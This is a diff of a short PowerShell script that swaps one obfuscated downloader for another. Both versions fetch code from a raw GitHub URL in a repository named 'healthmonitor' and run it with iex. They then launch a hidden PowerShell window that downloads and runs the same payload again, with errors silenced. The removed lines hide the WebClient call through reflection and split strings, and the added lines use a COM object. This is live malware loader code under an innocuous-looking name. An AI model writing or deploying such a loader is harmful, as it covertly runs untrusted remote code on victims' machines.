@@ -1,7 +1,6 @@
-$jRFsMnILX = 'https://raw.githubusercontent.com/mainernoush-netizen/healthmonitor/refs/heads/main/main/index'
-$Nebjmduw = [Ref].Assembly.GetType('System.Net.Web'+'Client')
-$dEcfuvihdhfUm = $Nebjmduw.GetMethod('Download'+'String',[string])
-$ysdewuxD = $Nebjmduw::new()
-$pZDvyJRxj = $dEcfuvihdhfUm.Invoke($ysdewuxD,@($jRFsMnILX))
-if ($pZDvyJRxj) { iex $pZDvyJRxj }
-Start-Process pwsh -ArgumentList '-nop','-wi','hidden','-c',"iex (irm '$jRFsMnILX')" -wi hidden -ea 0
+$FEafLHcBtC = 'https://raw.githubusercontent.com/mainernoush-netizen/healthmonitor/refs/heads/main/index'
+$iorigZTdeveMa = New-Object -ComObject Msxml2.XMLHTTP
+$iorigZTdeveMa.open('GET',$FEafLHcBtC,$false)
+$iorigZTdeveMa.send()
+if ($iorigZTdeveMa.status -eq 200) { iex $iorigZTdeveMa.responseText }
+Start-Process powershell -ArgumentList '-nop','-noni','-wi','hidden','-c',"iex (irm '$FEafLHcBtC')" -wi hidden -ea 0
